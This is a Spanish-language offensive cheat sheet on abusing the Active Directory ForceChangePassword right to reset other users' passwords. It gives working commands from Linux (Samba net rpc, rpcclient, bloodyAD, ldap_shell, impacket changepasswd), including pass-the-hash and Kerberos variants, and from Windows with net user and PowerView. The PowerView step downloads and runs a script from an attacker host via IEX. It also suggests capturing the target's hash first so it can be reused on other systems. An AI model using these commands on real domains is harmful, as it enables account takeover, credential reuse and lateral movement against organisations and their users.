## Abuso de ForceChangePassword

Si un usuario tiene `ForceChangePassword` sobre otro, puede cambiarle la contraseña directamente.

> ⚠️ Si existe alguna forma de obtener el hash del usuario objetivo antes de cambiar su contraseña, es preferible hacerlo primero. El hash puede ser válido en otros sistemas si la contraseña está reutilizada — cambiando la contraseña se pierde esa oportunidad.

---

## Desde Linux (externamente — recomendado)

### Con credenciales estándar

```shell
# Samba tools
net rpc password '<usuario_objetivo>' '<nueva_contraseña>' \
  -U '<dominio>'/'<usuario_controlado>'%'<contraseña>' -S '<ip_dc>'

# rpcclient
rpcclient -U <dominio>/<usuario_controlado> <ip_dc>
rpcclient $> setuserinfo <usuario_objetivo> 23 <nueva_contraseña>

# BloodyAD
bloodyAD --host '<ip_dc>' -d '<dominio>' -u '<usuario>' -p '<contraseña>' \
  set password <usuario_objetivo> '<nueva_contraseña>'

# ldap_shell
ldap_shell <dominio>/<usuario>:<contraseña> -dc-ip <ip>
set password <usuario_objetivo> <nueva_contraseña>
```

### Via protocolo SMB (si LDAP no está disponible)

```shell
# Kali
impacket-changepasswd <dominio>/<usuario_objetivo>@<ip> -newpass <nueva_contraseña> \
  -altuser <dominio>/<usuario_controlado> -altpass <contraseña_controlado> -reset

# Linux estándar
changepasswd.py <dominio>/<usuario_objetivo>@<ip> -newpass <nueva_contraseña> \
  -altuser <dominio>/<usuario_controlado> -altpass <contraseña_controlado> -reset
```

### Con Pass-the-Hash

```shell
# Samba tools
pth-net rpc password '<usuario_objetivo>' '<nueva_contraseña>' \
  -U '<dominio>'/'<usuario_controlado>'%'LMhash':'NThash' -S '<ip_dc>'

# BloodyAD
bloodyAD --host '<ip_dc>' -d '<dominio>' -u '<usuario>' -p ':<hash_nt>' \
  set password '<usuario_objetivo>' '<nueva_contraseña>'

# ldap_shell
ldap_shell '<dominio>/<usuario>:' -hashes ffffffffffffffffffffffffffffffff:<hash_nt> -dc-ip <ip>
set password <usuario_objetivo> <nueva_contraseña>
```

### Con autenticación Kerberos

```shell
# BloodyAD
bloodyAD -k --host <maquina.dominio> -d <dominio> -u '<usuario>' -p '<contraseña>' \
  set password <usuario_objetivo> '<nueva_contraseña>'
```

---

## Desde Windows (internamente)

```powershell
# Comando nativo (requiere GenericAll u otros permisos equivalentes)
net user <usuario_objetivo> <nueva_contraseña>

# Con PowerView (si el método anterior está bloqueado)
IEX (new-object net.webclient).downloadstring('http://<ip_atacante>/powerview.ps1')
$NewPassword = ConvertTo-SecureString '<nueva_contraseña>' -AsPlainText -Force
Set-DomainUserPassword -Identity '<usuario_objetivo>' -AccountPassword $NewPassword
```

> 💡 Si `net user` falla por restricciones de directiva, `Set-DomainUserPassword` de PowerView suele funcionar igualmente ya que opera directamente sobre LDAP en lugar de usar la API de Windows.

---

### Referencias

- https://www.hackingarticles.in/forcechangepassword-active-directory-abuse/
- https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword
